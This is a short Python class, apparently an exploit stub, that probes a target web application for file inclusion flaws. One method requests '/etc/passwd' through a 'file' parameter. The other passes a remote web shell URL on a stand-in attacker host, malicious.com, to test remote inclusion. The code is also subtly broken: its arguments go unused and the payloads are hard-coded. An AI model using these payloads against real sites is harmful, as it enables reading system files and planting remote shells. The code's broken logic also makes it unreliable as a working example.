class FileInclusionExploit:
    def __init__(self, target_url):
        self.target_url = target_url

    def exploit_lfi(self, file_name):
        payload = f"/etc/passwd"
        response = requests.get(self.target_url, params={"file": payload})
        return "root" in response.text

    def exploit_rfi(self, file_url):
        payload = f"http://malicious.com/shell.php"
        response = requests.get(self.target_url, params={"file": payload})
        return "shell" in response.text
